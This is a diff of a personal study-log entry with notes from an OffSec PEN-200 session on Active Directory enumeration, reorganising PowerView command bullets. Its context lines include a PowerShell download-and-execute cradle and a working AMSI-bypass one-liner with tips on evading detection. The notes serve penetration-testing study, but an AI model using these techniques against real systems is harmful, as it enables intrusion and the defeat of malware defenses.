@@ -5,7 +5,7 @@ date:: 2022-08-24
 
 Notes from OffSec Live in the morning (as usual), and then a few more YouTube videos about AWS this evening.
 
-## OffSec Live: PEN-200 — Active Directory Reconnaissance
+## OffSec Live: PEN-200 — Active Directory Enumeration & Exploitation, Part 1
 
 * The Windows `whoami` supports a lot of flags. For example, `whoami /privs` returns privilege information, while `whoami /all` returns *tons* of information about the current user.
 * The Windows host name will be returned by the `hostname` command.
@@ -18,11 +18,12 @@ Notes from OffSec Live in the morning (as usual), and then a few more YouTube vi
 * See all Windows administrators for the local system: `net localgroup administrators`
 * By default, all members of the `Domain Admins` domain group are admins of both the *domain* and *all* machines in that domain.
 * One way to show domain group membership is to use `net group $GROUP /domain`. However, this *doesn’t* show domain groups that are members of that group; for this you need to use PowerShell.
-* The `Get-DomainUsers | select name, memberof` PowerShell command will get domain users and associated groups.
-* The `Get-DomainGroupMember -Identity $GROUP_NAME` PowerShell command will get all domain group members, *including* nested domain groups.
-* The `Get-NetLoggedon | select UserName` PowerShell command will show all users that previously logged on to the current machine. It requires administrative privileges to be run against remote machines.
-* The `Get-NetSession` PowerShell command will show all users who are logged in to the current machine *right now*. It can be called *without* admin privileges from Windows Server systems.
-* A good enumeration tool is `PowerView.ps1`. For example, it includes the `Invoke-UserHunter` command that bundles up `Get-NetLoggedon` and `Get-NetSession` to hunt for currently logged in domain admins.
+* A good enumeration tool is `PowerView.ps1`. 
+* One tool supplied by `PowerView.ps1` is the `Get-DomainUsers | select name, memberof` command, which gets domain users and associated groups.
+* The `Get-DomainGroupMember -Identity $GROUP_NAME` command for `PowerView.ps1` will get all domain group members, *including* nested domain groups.
+* Another `PowerView.ps1` command is `Get-NetLoggedon | select UserName`, will show all users that previously logged on to the current machine. It requires administrative privileges to be run against remote machines.
+* The `Get-NetSession` command for `PowerView.ps1` shows all users who are logged in to the current machine *right now*. It can be called *without* admin privileges from Windows Server systems.
+* Finally, the `Invoke-UserHunter` command for `PowerView.ps1` bundles up `Get-NetLoggedon` and `Get-NetSession` to hunt for currently logged in domain admins.
 * You can download a remote script into memory and execute it using PowerShell using `IEX (New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")`. You can also load scripts into variables this way (just replace `IEX` with a variable assignment).
 * Windows Defender uses a process called AMSI that triggers when a script is run in PowerShell (this includes invocations of `IEX` for in-memory scripts). However, there’s a lot of bypasses for this — for example, you can cause the AMSI init function to error out using `[REF].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`.
 * AMSI traps all PowerShell commands that contain all AMSI-function related strings, however. The search uses regular expressions, and can be bypassed by putting portions of the script you’re trying to call in variables, and then calling these instead. If you really need a one-liner, you can also do some fancy hex code conversion (see the “Bypass AMSI by manual modification” link).
@@ -32,7 +33,7 @@ Notes from OffSec Live in the morning (as usual), and then a few more YouTube vi
 
 * [OffSec Live](https://www.offensive-security.com/offsec/offsec-live/)
 * [Join OffSec Live](https://learn.offensive-security.com/offsec-live-webinars)
-* [PowerShellEmpire / PowerTools / PowerView / powerview.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
+* [PowerShellMafia / PowerSploit / Recon / PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 * [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
 
 ## Another Day, Another Billion Packets
